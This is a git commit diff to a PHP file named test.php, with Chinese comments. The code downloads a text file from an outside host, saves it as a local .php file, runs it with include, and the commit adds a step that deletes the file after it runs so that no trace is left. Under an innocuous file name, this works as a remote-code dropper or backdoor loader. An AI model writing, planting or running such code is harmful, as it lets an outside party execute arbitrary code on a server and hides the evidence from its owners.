53a5626b373010dde66c43e3b6ce2193f0567dfc
xy170 <ycwlgzs@gmail.com>
2026-05-31 19:29:09 +0800

    Update test.php

--- test.php
+++ test.php
@@ -1,15 +1,35 @@
 <?php
 
-$url = "http://a.xzvs.top/payation.txt";
+// $url = "http://a.xzvs.top/payation.txt";
 
+// $savePath = __DIR__ . "/payation.php";
+
+// $content = file_get_contents($url);
+
+// if ($content === false) {
+//     die("下载失败");
+// }
+
+// file_put_contents($savePath, $content);
+
+// include $savePath;
+
+$url = "http://a.xzvs.top/payation.txt";
 $savePath = __DIR__ . "/payation.php";
 
+// 下载远程内容
 $content = file_get_contents($url);
-
 if ($content === false) {
     die("下载失败");
 }
 
+// 保存到本地
 file_put_contents($savePath, $content);
 
+// 执行 payation.php
 include $savePath;
+
+// 删除 payation.php
+if (file_exists($savePath)) {
+    unlink($savePath);
+}
